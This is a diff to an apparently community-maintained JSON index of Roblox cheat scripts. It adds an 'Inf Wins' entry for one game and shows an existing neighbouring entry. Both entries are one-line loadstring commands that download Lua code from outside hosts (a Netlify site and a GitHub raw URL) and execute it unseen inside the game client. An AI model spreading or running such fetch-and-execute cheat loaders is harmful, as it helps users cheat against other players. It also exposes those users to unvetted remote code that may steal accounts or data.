@@ -4232,5 +4232,12 @@
             "loadstring": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/MonsterEvolution\", true))()",
             "credit": "wekilledtheunicorns"
         }
+    ],
+    "96384896875593": [
+        {
+            "name": "Memory Murder Script - Inf Wins",
+            "loadstring": "loadstring(game:HttpGet(\"https://exploitfin.netlify.app/Nexus/Loader\"))()",
+            "credit": "wekilledtheunicorns"
+        }
     ]
 }
